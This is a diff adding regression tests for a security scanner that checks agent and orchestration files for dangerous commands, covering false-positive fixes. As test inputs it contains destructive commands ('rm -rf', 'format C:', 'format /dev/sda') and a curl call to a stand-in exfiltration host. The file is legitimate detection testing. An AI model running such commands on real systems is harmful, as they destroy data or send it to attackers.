@@ -436,3 +436,61 @@ rm -rf /var/log
         content = "rm -rf /tmp"
         findings = scanner.scan(content, ArtifactType.MCP, "mcp.json")
         assert all(f.artifact_type == ArtifactType.MCP for f in findings)
+
+
+class TestFalsePositiveFixes:
+    """Regression tests for false-positive fixes in PermAuditScanner.
+
+    Verifies that the tightened 'format' regex and the ORCHESTRATION URL
+    suppression do not produce spurious findings for common patterns.
+    """
+
+    @pytest.fixture
+    def scanner(self) -> PermAuditScanner:
+        return PermAuditScanner()
+
+    # --- Fix #2: format regex ---
+
+    def test_python_logging_format_not_flagged(self, scanner: PermAuditScanner) -> None:
+        """Python logging format= argument must not trigger 'Disk format command'."""
+        content = 'logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")'
+        findings = scanner.scan(content, ArtifactType.ORCHESTRATION, "app.py")
+        disk_format = [f for f in findings if "Disk format" in f.description]
+        assert len(disk_format) == 0
+
+    def test_docstring_format_word_not_flagged(self, scanner: PermAuditScanner) -> None:
+        """The word 'format' in a comment or docstring must not trigger a finding."""
+        content = "# The file contains one path per line in the format:"
+        findings = scanner.scan(content, ArtifactType.SKILL, "readme.md")
+        disk_format = [f for f in findings if "Disk format" in f.description]
+        assert len(disk_format) == 0
+
+    def test_format_drive_letter_still_flagged(self, scanner: PermAuditScanner) -> None:
+        """Windows 'format C:' must still be detected."""
+        content = "format C: /FS:NTFS"
+        findings = scanner.scan(content, ArtifactType.AGENT, "disk_agent.md")
+        disk_format = [f for f in findings if "Disk format" in f.description]
+        assert len(disk_format) >= 1
+
+    def test_format_dev_path_still_flagged(self, scanner: PermAuditScanner) -> None:
+        """Linux 'format /dev/sda' must still be detected."""
+        content = "format /dev/sda"
+        findings = scanner.scan(content, ArtifactType.AGENT, "disk_agent.md")
+        disk_format = [f for f in findings if "Disk format" in f.description]
+        assert len(disk_format) >= 1
+
+    # --- Fix #5: ORCHESTRATION URL metadata ---
+
+    def test_orchestration_metadata_url_not_flagged(self, scanner: PermAuditScanner) -> None:
+        """A 'url: https://...' in orchestration YAML metadata must not be flagged."""
+        content = "url: https://gitlab.example.com/group/project"
+        findings = scanner.scan(content, ArtifactType.ORCHESTRATION, "catalog-entry.yaml")
+        url_findings = [f for f in findings if "External URL" in f.description]
+        assert len(url_findings) == 0
+
+    def test_orchestration_curl_still_flagged(self, scanner: PermAuditScanner) -> None:
+        """Active curl commands in orchestration artifacts must still be flagged."""
+        content = "curl https://evil.example.com/exfiltrate"
+        findings = scanner.scan(content, ArtifactType.ORCHESTRATION, "workflow.yaml")
+        curl_findings = [f for f in findings if "curl" in f.description.lower()]
+        assert len(curl_findings) >= 1
